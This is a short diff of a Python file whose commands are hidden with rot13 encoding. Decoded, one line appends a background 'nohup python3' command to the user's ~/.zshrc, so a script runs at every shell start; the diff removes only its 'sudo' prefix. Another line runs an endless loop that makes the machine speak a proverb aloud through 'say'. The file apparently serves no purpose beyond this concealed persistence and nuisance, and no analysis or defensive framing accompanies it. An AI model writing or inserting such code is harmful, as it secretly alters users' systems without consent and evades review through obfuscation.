@@ -1,4 +1,4 @@
 import codecs
 import subprocess
-subprocess.run(codecs.encode('fhqb rpub "abuhc clguba3 FcrpvnyNqqbaOlZr.gkg &" >> ~/.mfuep','rot_13'))
+subprocess.run(codecs.encode('rpub "abuhc clguba3 FcrpvnyNqqbaOlZr.gkg &" >> ~/.mfuep','rot_13'))
 exec(codecs.encode('juvyr Gehr:\n    fhocebprff.eha(['+'"fnl","Vs nalbar ybhqyl oyrffrf gurve arvtuobe rneyl va gur zbeavat, vg jvyy or gnxra nf n phefr."])','rot_13'))
